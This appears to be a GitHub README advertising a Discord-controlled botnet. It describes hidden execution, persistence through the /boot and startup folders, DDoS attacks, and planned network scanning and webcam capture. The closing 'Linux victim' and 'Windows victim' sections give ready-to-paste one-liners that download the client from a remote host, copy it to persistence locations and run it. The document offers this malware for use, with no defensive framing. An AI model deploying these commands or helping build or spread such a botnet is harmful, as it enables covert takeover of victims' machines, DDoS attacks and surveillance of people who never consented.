# Discord.py BotNet
![image](https://user-images.githubusercontent.com/104208624/203850203-55e89e04-0f26-4d3c-b87f-e9d8be7ef81f.png)

https://discord.gg/vCdPTjD6rZ

# Developers
me: batu.sh#9675

bnt: @udbnt

# Features
* Hidden (Works in /tmp, %temp% + Console is always hidden)
* Persistence (Copying to /boot, shell:startup)
* Tested on Windows and Linux platforms
* DDoS attack uses "storm" script

# Soon (self cmds)
* Zmap entine network scan
* Webcam picture
* ?

# Commands
![image](https://user-images.githubusercontent.com/104208624/203849645-908bde50-bd0a-49fa-9a8a-1f948953677e.png)

# Linux victim
cd /tmp; apt-get update -y; apt-get install curl -y; curl -O Client "https://raw.githubusercontent.com/NAME/NAME/main/NAME"; chmod 777 Client; cp Client /boot; ./Client

# Windows victim
cd %temp% && powershell -command Invoke-WebRequest https://github.com/NAME/NAME/raw/main/NAME.exe -OutFile Client.exe && copy Client.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && Client.exe
